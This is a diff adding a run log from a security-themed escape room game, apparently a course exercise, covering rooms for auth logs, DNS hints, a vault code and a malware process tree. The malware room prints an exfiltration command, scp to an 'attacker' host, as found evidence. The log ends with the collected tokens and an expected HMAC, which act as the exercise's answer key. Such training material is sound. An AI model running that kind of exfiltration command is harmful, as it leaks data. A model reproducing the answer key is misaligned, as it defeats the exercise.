@@ -1,0 +1,58 @@
+05/11/25 19:32:37 - Welcome to the escape room game
+05/11/25 19:32:37 - 
+    ___________                                    __________                                                             
+    \_   _____/ ______ ____ _____  ______   ____   \______   \ ____   ____   _____                                        
+     |    __)_ /  ___// ___\\__  \ \____ \_/ __ \   |       _//  _ \ /  _ \ /     \                                       
+     |        \\___ \\  \___ / __ \|  |_> >  ___/   |    |   (  <_> |  <_> )  Y Y  \
+    /_______  /____  >\___  >____  /   __/ \___  >  |____|_  /\____/ \____/|__|_|  /                                      
+            \/     \/     \/     \/|__|        \/          \/                    \/                                       
+        
+05/11/25 19:32:37 - Enjoy the escape room!
+05/11/25 19:32:37 - Type quit to quit
+05/11/25 19:32:37 - Type hint for assistance
+05/11/25 19:32:37 - User called move soc
+05/11/25 19:32:37 - You have entered into CurrentRoom.SOC
+05/11/25 19:32:37 - User called inspect auth.log
+05/11/25 19:32:37 - SOC: TOKEN[KEYPAD]=7055
+05/11/25 19:32:37 - SOC: EVIDENCE[KEYPAD].TOP24=192.0.2.0/24
+05/11/25 19:32:37 - SOC: EVIDENCE[KEYPAD].COUNT=55
+05/11/25 19:32:37 - SOC: EVIDENCE[KEYPAD].SAMPLE=2025-08-09T12:01:17Z lab1 sshd[3405]: Failed password for admin from 192.0.2.70 port 53632 protocol 2
+05/11/25 19:32:37 - SOC: EVIDENCE[KEYPAD].MALFORMED_SKIPPED=2
+05/11/25 19:32:37 - User called move dns
+05/11/25 19:32:37 - You have entered into CurrentRoom.DNS
+05/11/25 19:32:37 - User called inspect dns.cfg
+05/11/25 19:32:37 - [DNSRoom] starting decode
+05/11/25 19:32:37 - Base64 decode error: Incorrect padding
+05/11/25 19:32:37 - [Room DNS] Decoding hints...
+05/11/25 19:32:37 - Decoded line: "Signals converge in the beacon if you read between lines."
+05/11/25 19:32:37 - Token formed: lines
+05/11/25 19:32:37 - DNS: TOKEN[DNS]=lines
+05/11/25 19:32:37 - DNS: EVIDENCE[DNS].KEY=hint4
+05/11/25 19:32:37 - DNS: EVIDENCE[DNS].DECODED_LINE=Signals converge in the beacon if you read between lines.
+05/11/25 19:32:37 - User called move vault
+05/11/25 19:32:37 - You have entered into CurrentRoom.VAULT
+05/11/25 19:32:37 - User called inspect vault_dump.txt
+05/11/25 19:32:37 - The values 
+SAFE{13-9-22}
+ are valid
+05/11/25 19:32:37 - The results of vault are: {'\nSAFE{13-9-22}\n': ('13', '9', '22')}
+05/11/25 19:32:37 - Vault: TOKEN[SAFE]=13-9-22
+05/11/25 19:32:37 - Vault: EVIDENCE[SAFE].MATCH=SAFE{13-9-22}
+05/11/25 19:32:37 - Vault: EVIDENCE[SAFE].CHECK=13+9=22
+05/11/25 19:32:37 - Returning token: 13-9-22
+05/11/25 19:32:37 - User called move malware
+05/11/25 19:32:37 - You have entered into CurrentRoom.MALWARE
+05/11/25 19:32:37 - User called inspect proc_tree.jsonl
+05/11/25 19:32:37 - [MalwareRoom] Starting traversal
+05/11/25 19:32:37 - [Room MALWARE] Found exfil path: [217->220->221->225]
+05/11/25 19:32:37 - [Room MALWARE] Matched command: "scp /tmp/x.tgz attacker@198.51.100.33:/upload"
+05/11/25 19:32:37 - Malware: TOKEN[PID]=225
+05/11/25 19:32:37 - Malware: EVIDENCE[PID].PATH=[217->220->221->225]
+05/11/25 19:32:37 - Malware: EVIDENCE[PID].CMD="scp /tmp/x.tgz attacker@198.51.100.33:/upload"
+05/11/25 19:32:37 - User called move gate
+05/11/25 19:32:37 - You have entered into CurrentRoom.FINAL_GATE
+05/11/25 19:32:37 - User called use final_gate
+05/11/25 19:32:37 - Final gate was opened with: FINAL_GATE=PENDING
+MSG=msc-group-02|7055-lines-225-13-9-22
+EXPECTED_HMAC=d57b140fd4acf4d1f0c2b3180e20596b50984a418c2b2bfb9f7006ec36ea04e2
+05/11/25 19:32:37 - Thank you for playing
